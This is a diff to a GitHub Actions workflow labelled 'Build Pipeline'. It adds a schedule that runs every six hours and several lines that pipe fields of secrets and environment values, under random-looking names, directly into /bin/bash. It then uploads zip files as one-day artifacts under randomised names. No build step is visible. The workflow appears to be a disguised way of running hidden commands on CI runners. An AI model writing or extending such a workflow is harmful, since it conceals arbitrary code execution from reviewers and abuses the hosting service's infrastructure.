@@ -2,6 +2,8 @@ name: Build Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '35 0,6,12,18 * * *'
 jobs:
   start:
     runs-on: ubuntu-latest
@@ -9,17 +11,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: Execute task
         env:
-          mncb332: ${{ secrets.mncb332 }}
+          jop9: ${{ secrets.jop9 }}
         run: |
-          printf '%s' "$mncb332" | jq -r .dvs70037 | /bin/bash
-          printf '%s' "$yfbm4" | jq -r .ypqsv12 | /bin/bash
-          echo $okltp75 | jq -r .ge7197 | /bin/bash
-          echo $zteu17 | jq -r .pc8 | /bin/bash
+          printf '%s' "$jop9" | jq -r .bhlev84 | /bin/bash
+          echo $u2 | jq -r .qk095 | /bin/bash
+          printf '%s' "$k74" | jq -r .pnm562 | /bin/bash
+          printf '%s' "$ob5" | jq -r .row345 | /bin/bash
+          echo $pswj90 | jq -r .cesiq4261 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
         uses: actions/upload-artifact@v4
         with:
-          name: uoisGwNR
+          name: Z8fULAYC
           path: "*.zip"
           retention-days: 1
